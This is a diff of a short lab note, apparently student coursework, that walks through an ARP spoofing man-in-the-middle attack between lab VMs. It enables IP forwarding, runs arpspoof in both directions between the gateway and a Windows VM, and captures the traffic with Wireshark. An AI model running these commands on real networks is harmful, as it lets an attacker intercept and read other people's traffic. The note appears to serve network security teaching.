@@ -1,15 +1,15 @@
 # Launch the Ubuntu virtual machine(192.168.1.50), and from terminal enable the IP packaet forwarding
 
-student@Ubuntu:~$ sudo nano /proc/sys/net/ipv4/ip_forward
+  student@Ubuntu:~$ sudo nano /proc/sys/net/ipv4/ip_forward
 #change the valuse from 0 to 1
 
 # Tell getway ( 192.168.1.1) that you are  window VM ( 192.168.1.100) 
 
-student@Ubuntu:~$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+  student@Ubuntu:~$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
 
 # Now tell window VM (192.168.1.100)  that you are getway (192.168.1.1)
 
-student@Ubuntu:~$ sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+  student@Ubuntu:~$ sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
 
 # Now you are in btween Window and Gatway, Window will thisnk you are Gatway and Gatway will think you are Window. In above code, communitaction weill go thrugh eth0 
 interface. Now we can launch Wireshark to capture data and filter by ARP type  for the analysis. 
